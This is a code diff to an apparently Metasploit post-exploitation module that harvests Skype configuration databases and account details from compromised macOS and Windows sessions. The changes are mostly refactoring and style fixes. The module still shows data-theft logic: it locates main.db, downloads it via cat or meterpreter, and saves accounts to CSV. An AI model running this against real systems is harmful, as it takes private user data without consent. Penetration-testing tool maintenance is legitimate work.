@@ -35,6 +35,11 @@ class MetasploitModule < Msf::Post
               stdapi_fs_stat
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -46,10 +51,9 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
     # syinfo is only on meterpreter sessions
-    print_status("Running Skype enumeration against #{sysinfo['Computer']}") if !sysinfo.nil?
+    print_status("Running Skype enumeration against #{sysinfo['Computer']}") unless sysinfo.nil?
 
     # Ensure that SQLite3 gem is installed
     begin
@@ -71,12 +75,12 @@ class MetasploitModule < Msf::Post
         next unless check_skype("#{p['dir']}/Library/Application Support/", p['name'])
 
         db_in_loot = download_db(p)
-        # Exit if file was not successfully downloaded
-        return if db_in_loot.nil?
+
+        next if db_in_loot.nil?
 
         process_db(db_in_loot, p['name'])
       end
-    elsif (((session.platform = - 'windows')) && (session.type == 'meterpreter'))
+    elsif ((session.platform = - 'windows')) && (session.type == 'meterpreter')
       # Iterate thru each user profile in a Windows System using Meterpreter Post API
       grab_user_profiles.each do |p|
         if check_skype(p['AppData'], p['UserName'])
@@ -121,11 +125,13 @@ class MetasploitModule < Msf::Post
       file = cmd_exec('mdfind', "-onlyin #{profile['dir']} -name main.db").split("\n").collect { |p| p =~ %r{Skype/\w*/main.db$} ? p : nil }.compact
     end
 
-    file_loc = store_loot('skype.config',
-                          'binary/db',
-                          session,
-                          'main.db',
-                          "Skype Configuration database for #{profile['UserName']}")
+    file_loc = store_loot(
+      'skype.config',
+      'binary/db',
+      session,
+      'main.db',
+      "Skype Configuration database for #{profile['UserName']}"
+    )
 
     file.each do |db|
       if session.type == 'meterpreter'
@@ -138,7 +144,8 @@ class MetasploitModule < Msf::Post
         maindb = cmd_exec('cat', "\"#{db}\"", datastore['TIMEOUT'])
         if maindb.nil?
           print_error('Could not download the file. Set the TIMEOUT option to a higher number.')
-          return
+          file_loc = nil
+          break
         end
         # Saving the content as binary so it can be used
         output = ::File.open(file_loc, 'wb')
@@ -185,12 +192,14 @@ class MetasploitModule < Msf::Post
 
     # Check if an account exists and if it does enumerate if not exit.
     if user_rows.length > 1
-      user_info = store_loot('skype.accounts',
-                             'text/plain',
-                             session,
-                             '',
-                             'skype_accounts.csv',
-                             "Skype User #{user} Account information from configuration database.")
+      user_info = store_loot(
+        'skype.accounts',
+        'text/plain',
+        session,
+        '',
+        'skype_accounts.csv',
+        "Skype User #{user} Account information from configuration database."
+      )
       print_good("Saving account information to #{user_info}")
       save_csv(user_rows, user_info)
     else
